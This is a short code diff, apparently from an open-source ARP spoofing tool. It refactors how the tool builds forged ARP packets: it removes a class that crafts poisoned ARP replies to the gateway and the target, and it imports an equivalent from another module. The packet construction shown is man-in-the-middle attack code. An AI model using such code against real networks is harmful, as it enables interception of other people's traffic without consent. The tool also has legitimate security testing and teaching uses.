@@ -4,41 +4,10 @@
 __author__ = 'EONRaider @ keybase.io/eonraider'
 
 import argparse
-import random
 import time
-from socket import htons, ntohs, socket, AF_PACKET, PF_PACKET, SOCK_RAW
+from socket import htons, ntohs, socket, PF_PACKET, SOCK_RAW
 
-from protocols import ARP, Ethernet, Packet
-
-
-class AttackPackets(object):
-    def __init__(self, *, attacker_mac: str, gateway_mac: str, gateway_ip: str,
-                 target_mac: str, target_ip: str):
-        self.attacker_mac = attacker_mac
-        self.gateway_mac = gateway_mac
-        self.gateway_ip = gateway_ip
-        self.target_mac = target_mac
-        self.target_ip = target_ip
-        self.payloads = self.payload_to_gateway, self.payload_to_target
-
-    def __iter__(self):
-        yield from self.payloads
-
-    @property
-    def payload_to_gateway(self):
-        gateway = Packet(Ethernet(dst=self.gateway_mac, src=self.attacker_mac,
-                                  eth=0x0806),
-                         ARP(sha=self.attacker_mac, spa=self.target_ip,
-                             tha=self.gateway_mac, tpa=self.gateway_ip))
-        return gateway.payload
-
-    @property
-    def payload_to_target(self):
-        target = Packet(Ethernet(dst=self.target_mac, src=self.attacker_mac,
-                                 eth=0x0806),
-                        ARP(sha=self.attacker_mac, spa=self.gateway_ip,
-                            tha=self.target_mac, tpa=self.target_ip))
-        return target.payload
+from packets import ARPSetupProxy
 
 
 class Spoofer(object):
